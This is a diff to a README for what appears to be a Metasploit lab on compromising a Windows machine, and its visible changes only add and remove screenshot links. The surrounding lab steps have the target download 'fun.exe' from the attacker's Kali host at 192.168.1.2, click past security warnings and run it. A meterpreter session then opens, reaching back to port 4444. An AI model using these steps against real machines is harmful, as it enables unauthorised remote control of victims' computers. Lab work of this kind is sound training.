@@ -83,13 +83,13 @@ exploit
 On the target Windows machine, open a Web browser and open this URL, replacing the IP address with the IP address of your Kali machine:
 http://192.168.1.2/fun.exe
 The file "fun.exe" downloads. 
+![image](https://github.com/user-attachments/assets/b8a94154-39f4-492d-9328-a12caeb16461)
 
 
 
 Bypass any warning boxes, double-click the file, and allow it to run.
 
 On kali give the command exploit
-![Screenshot 2025-04-07 115311](https://github.com/user-attachments/assets/729f2f9c-6a51-4a9f-ae75-24260cfc721d)
 
 
 To see a list of processes, at the meterpreter > prompt, execute this command:
@@ -105,7 +105,7 @@ at meterpreter > prompt, execute this command:
 netstat
 A list of network connections appears, including one to a remote port of 4444, as highlighted in the image below.
 Notice the "PID/Program name" value for this connection, which is redacted 
-![ss](https://github.com/praveenst13/Compromising-windows-using-Metasploit/assets/118787793/b2d36ca1-64a2-4863-a648-4ef4a8727dd9)
+
 
 
 
